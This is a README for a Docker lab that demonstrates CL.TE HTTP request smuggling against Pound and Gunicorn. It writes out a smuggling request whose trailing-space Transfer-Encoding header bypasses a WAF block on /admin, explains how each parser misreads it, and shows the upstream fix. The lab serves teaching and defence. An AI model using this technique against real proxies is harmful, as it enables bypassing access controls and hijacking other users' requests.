# HTTP Request Smuggling (CL.TE) Lab

A CL.TE request smuggling exercise that bypasses a frontend WAF rule. The goal is to reach `GET /admin` on the backend even though the frontend returns `403` for any request whose URL starts with `/admin`.

The lab is self-contained: a single script sends two requests over one keep-alive connection. There is no separate victim container. The second request stands in for "the next request on the pooled connection" and is what receives the smuggled `/admin` prefix.

## Stack

| Role | Technology | Why it is vulnerable |
|------|-----------|----------------------|
| Frontend / WAF | **Pound** (commit `8d86d52d`) | Pre-fix for [GH issue #26](https://github.com/graygnuorg/pound/issues/26). `cs_locate_token()` compared the Transfer-Encoding value against `"chunked"` as an exact token. The value `chunked ` (with a trailing space) is not recognised as that token, so Pound does not set its internal `chunked` flag, skips the anti-smuggling check, frames the body with Content-Length, and forwards both headers verbatim. |
| Backend | **Gunicorn 20.0.4** + Flask 2.3.3 | Its Transfer-Encoding handling treats the header as chunked whenever the value contains `chunked` (substring), so it accepts `chunked ` and reads the body as chunked transfer encoding. The mismatch between the two parsers is the smuggling primitive. |

## Architecture

```
 Attacker (host), attack.py
          |
      port 80
          |
  +-------------------------------------------------+
  | Pound (frontend)                                |
  |  WAF: URL "^/admin" → 403                       |
  |  BUG: TE "chunked " unrecognised → uses CL      |
  |       forwards BOTH headers to backend          |
  +-------------------------------------------------+
          |  persistent TCP connection (keep-alive)
  +-------------------------------------------------+
  | Gunicorn 20.0.4 + Flask                         |
  |  GET /       : echoes method/path/headers/body  |
  |  GET /admin  : flag + incoming headers (goal)   |
  +-------------------------------------------------+
```

Two containers only: `frontend` (Pound, port 80) and `backend` (Gunicorn, port 5000, also published for inspection). See `docker-compose.yml`.

### Files

```
http-smuggling/
├── docker-compose.yml   ← frontend + backend, no victim container
├── attack.py            ← run from host after docker compose up
├── frontend/
│   ├── Dockerfile       ← builds Pound from source at vulnerable commit 8d86d52d
│   └── pound.cfg        ← WAF rule (block ^/admin) + backend config
└── backend/
    ├── Dockerfile       ← Gunicorn 20.0.4 + Flask 2.3.3 (deps inline, no requirements.txt)
    └── app.py           ← /admin (flag) and catch-all echo routes
```

## Setup

```bash
docker compose up --build
docker compose up -d
```

The Pound build takes 2-3 minutes (compiled from source).

## Verify the WAF

```bash
curl http://localhost/admin
# 403, the frontend blocks /admin

curl http://localhost/
# 200, normal response, backend echoes the request
```

You can also reach the backend directly (bypassing the WAF) to confirm the flag exists:

```bash
curl http://localhost:5000/admin
# 200, admin JSON with the flag
```

## Run the Attack

```bash
python3 attack.py
```

The script opens one connection and sends two requests. Response 1 is the backend's reply to the `POST /`. Response 2 is the reply to the follow-up `GET /`, but because the smuggled `GET /admin` prefix was left in the backend's receive buffer, the backend answers that follow-up as `/admin` and returns the flag.

---

## Attack walkthrough

### The requests

Request 1 (smuggling carrier):

```
POST / HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: <len(BODY)>
Transfer-Encoding: chunked
Connection: keep-alive

0\r\n
\r\n
GET /admin HTTP/1.1\r\n
Host: localhost\r\n
X-Absorb: 
```

Note the trailing space after `chunked` in the Transfer-Encoding header. That single byte is what makes Pound and Gunicorn disagree.

Request 2 (follow-up, sent on the same connection):

```
GET / HTTP/1.1
Host: localhost
Cookie: session=RANDOM
Connection: close
```

### Why each piece behaves the way it does

**Pound (frontend)**

`cs_locate_token()` in the vulnerable version matches the Transfer-Encoding value against the exact token `chunked`. The value `chunked ` (trailing space) is not recognised as that token, so Pound never marks the request as chunked. The anti-smuggling check that rejects a request carrying both Transfer-Encoding and Content-Length is skipped, Pound frames the body using Content-Length, and forwards the request with both headers intact.

**Gunicorn 20.0.4 (backend)**

Receives the forwarded request with both headers. Its Transfer-Encoding check treats the body as chunked whenever the value contains `chunked`. The value `chunked ` contains that substring, so Gunicorn reads the body as chunked: it sees `0\r\n\r\n` (terminating chunk) and considers the request body complete. The remaining bytes (`GET /admin HTTP/1.1\r\nHost: localhost\r\nX-Absorb: `) stay in the kernel receive buffer of the backend connection.

**Connection pool**

Pound returns the backend connection to its keep-alive pool. The next request dispatched over that connection (here, the follow-up `GET /`) is appended to the leftover bytes.

**Follow-up request**

Gunicorn reads from the socket and sees:

```
GET /admin HTTP/1.1\r\nHost: localhost\r\nX-Absorb: GET / HTTP/1.1\r\nHost: localhost\r\nCookie: session=RANDOM\r\nConnection: close\r\n\r\n
```

It parses this as `GET /admin`. The follow-up request line (`GET / HTTP/1.1`) is swallowed as the value of the `X-Absorb` header. The `/admin` handler echoes all incoming headers in its JSON response, so you can see the follow-up's own headers (including its Cookie) were delivered to `/admin`.

**Result:** Pound's WAF never saw `/admin` in the smuggled request, so it never returned 403. The backend served the admin page, including the flag `flag{cl_te_smuggling_success}`, and its logs show `/admin` was reached.

---

## Fix

The upstream fix for this class of bug tracks any Transfer-Encoding value as a distinct state instead of only recognising an exact `chunked` token, and rejects a request that carries both Transfer-Encoding and Content-Length:

```c
// Vulnerable: only an exact "chunked" token flips the flag;
// anything else (e.g. "chunked ") leaves the request untracked.
if (cs_locate_token(val, "chunked", &next))
    chunked = 1;

// Fixed: track chunked vs. any other (unknown) TE value...
if (cs_locate_token(val, "chunked", &next))
    transfer_encoding = TRANSFER_ENCODING_CHUNKED;
else
    transfer_encoding = TRANSFER_ENCODING_UNKNOWN;

// ...and reject TE + CL combinations outright.
if (transfer_encoding != TRANSFER_ENCODING_NONE && content_length != NO_CONTENT_LENGTH)
    return HTTP_STATUS_BAD_REQUEST;
```

## Stop and clean up

```bash
docker compose down
```
